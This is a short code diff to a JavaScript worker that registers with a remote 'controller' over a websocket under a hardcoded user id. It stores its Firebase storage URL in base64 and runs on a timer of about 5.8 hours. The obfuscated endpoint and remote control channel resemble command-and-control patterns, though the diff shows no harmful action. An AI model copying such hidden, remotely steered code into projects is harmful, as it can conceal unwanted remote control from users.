@@ -14,6 +14,8 @@ let FINISH = new Date().getTime()+21000000
 
 let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9kYXRhYmFzZTA4OC5hcHBzcG90LmNvbS9vLw==')
 
+USER = 'icfvrcighp71668'
+
 startServer()
 
 setInterval(() => {
@@ -77,7 +79,7 @@ async function runWebSocket(url) {
     ws.on('open', () => {
         ws.send(JSON.stringify({ t: 2, s: 'controller', d: { s:0, i:USER } }))
         ws.send(JSON.stringify({ t: 3, s: 'controller', d: { s:1, t: Date.now(), i:USER } }))
-        ws.send(JSON.stringify({ t: 1, s: USER+'_cmd' }))
+        ws.send(JSON.stringify({ t: 1, s: USER }))
         reconnecting = false
         CONNECTION = ws
     })
@@ -176,7 +178,7 @@ async function closeProcess() {
 
 async function sendFinishData() {
     finishStatus = false
-    if (sendWSMessage(CONNECTION, JSON.stringify({ t: 6, s: 'server', d: { s:0, t: Date.now(), i:USER } }))) {
+    if (sendWSMessage(CONNECTION, JSON.stringify({ t: 6, s: 'controller', d: { s:0, t: Date.now(), i:USER } }))) {
         for (let i = 0; i < 10; i++) {
             await delay(100)
             if (finishStatus) {
@@ -276,21 +278,6 @@ async function postAxios(url, body, data) {
             body: body
         })
     } catch (error) {}
-}
-
-async function patchFetch(url, data, headers = {}) {
-    try {
-        let res = await fetch(url, {
-            method: 'PATCH',
-            headers: { ...headers },
-            body: JSON.stringify(data)
-        })
-
-        let json = await res.json()
-        return json
-    } catch (err) {
-        throw null
-    }
 }
 
 
